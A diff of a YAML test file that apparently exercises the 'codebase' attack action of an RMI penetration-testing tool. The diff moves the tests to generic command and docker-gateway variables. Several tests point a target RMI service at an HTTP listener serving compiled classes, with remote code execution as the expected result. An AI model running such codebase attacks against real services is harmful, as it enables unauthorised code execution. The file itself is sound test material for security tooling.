@@ -4,21 +4,21 @@ tester:
   description: "Performs tests on remote-methods-guessers 'codebase' action."
 
 plugins:
-  os_command:
-    cmd:
-      - javac
-      - -source
-      - 1.8
-      - -target
-      - 1.8
-      - '../../utils/${codebase-class}1.java'
-      - '../../utils/${codebase-class}2.java'
-      - '../../utils/${codebase-class}3.java'
-      - '../../utils/${codebase-class}4.java'
+  - os_command:
+      cmd:
+        - javac
+        - -source
+        - 1.8
+        - -target
+        - 1.8
+        - '../../utils/${codebase-class}1.java'
+        - '../../utils/${codebase-class}2.java'
+        - '../../utils/${codebase-class}3.java'
+        - '../../utils/${codebase-class}4.java'
 
-  http_listener:
-    port: 8000
-    dir: ../../utils
+  - http_listener:
+      port: 8000
+      dir: ../../utils
 
 tests:
   - title: Activator Codebase Call
@@ -27,11 +27,11 @@ tests:
       'The expected result is a file being created within the docker'
       'volume.'
 
-    command: '${BASE-CMD-9}'
+    command: '${BASE-CMD}'
     arguments:
       - codebase
       - '${codebase-class}1'
-      - 'http://${jdk9-GW}:8000/'
+      - 'http://${DOCKER-GW}:8000/'
       - --signature
       - act
     validators:
@@ -49,11 +49,11 @@ tests:
       'The expected result is a file being created within the docker'
       'volume.'
 
-    command: '${BASE-CMD-9}'
+    command: '${BASE-CMD}'
     arguments:
       - codebase
       - '${codebase-class}2'
-      - 'http://${jdk9-GW}:8000/'
+      - 'http://${DOCKER-GW}:8000/'
       - --signature
       - reg
     validators:
@@ -70,11 +70,11 @@ tests:
       'Performs a codebase attack on the DGC endpoint.'
       'The expected result is an AccessControlException'
 
-    command: '${BASE-CMD-9}'
+    command: '${BASE-CMD}'
     arguments:
       - codebase
       - '${codebase-class}'
-      - 'http://${jdk9-GW}:8000/'
+      - 'http://${DOCKER-GW}:8000/'
       - --signature
       - dgc
     validators:
@@ -91,11 +91,11 @@ tests:
       'The expected result is a file being created within the docker'
       'volume.'
 
-    command: '${BASE-CMD-SSL-9}'
+    command: '${BASE-CMD-SSL}'
     arguments:
       - codebase
       - '${codebase-class}3'
-      - 'http://${jdk9-GW}:8000/'
+      - 'http://${DOCKER-GW}:8000/'
       - --signature
       - 'String system(String dummy, String[] dummy2)'
       - --bound-name
@@ -118,11 +118,11 @@ tests:
       'The expected result is a file being created within the docker'
       'volume.'
 
-    command: '${BASE-CMD-9}'
+    command: '${BASE-CMD}'
     arguments:
       - codebase
       - '${codebase-class}4'
-      - 'http://${jdk9-GW}:8000/'
+      - 'http://${DOCKER-GW}:8000/'
       - --signature
       - 'String login(java.util.HashMap dummy1)'
       - --bound-name
@@ -144,11 +144,11 @@ tests:
       'Performs a codebase attack with missing --signature option and checks'
       'the corresponding error message.'
 
-    command: '${BASE-CMD-9}'
+    command: '${BASE-CMD}'
     arguments:
       - codebase
       - '${codebase-class}4'
-      - 'http://${jdk9-GW}:8000/'
+      - 'http://${DOCKER-GW}:8000/'
     validators:
       - error: True
       - contains:
@@ -160,7 +160,7 @@ tests:
     description: >
       'Performs a codebase attack with a wrong specified listener port.'
 
-    command: '${BASE-CMD-9}'
+    command: '${BASE-CMD}'
     arguments:
       - codebase
       - 'Test'
